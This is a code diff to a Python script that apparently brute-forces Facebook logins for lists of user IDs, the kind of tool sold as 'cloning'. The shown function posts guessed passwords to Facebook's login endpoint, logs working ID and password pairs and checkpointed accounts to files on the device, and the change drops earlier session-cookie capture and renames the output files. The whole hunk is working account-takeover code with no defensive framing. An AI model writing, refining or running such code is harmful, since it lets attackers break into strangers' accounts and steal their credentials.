@@ -773,24 +773,25 @@ def login1(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
-                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
-                open("/sdcard/ANAS_OLD-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;46m[ANAS-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                open("/sdcard/ANAS_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;46m[ANAS-OK] {uid} ● {pw}\033[1;97m')
                 break
 
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
-                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
-                open("/sdcard/ANAS_OLD-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                open("/sdcard/ANAS_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
+                print(f'\r\033[38;5;226m[ANAS-CP] {uid} ● {pw}\033[1;97m')
                 break
 
             else:
                 continue
+
         loop += 1
+
     except Exception as e:
-        time.sleep(2)
+        time.sleep(10)
+
 
 if __name__ == "__main__":
     main()
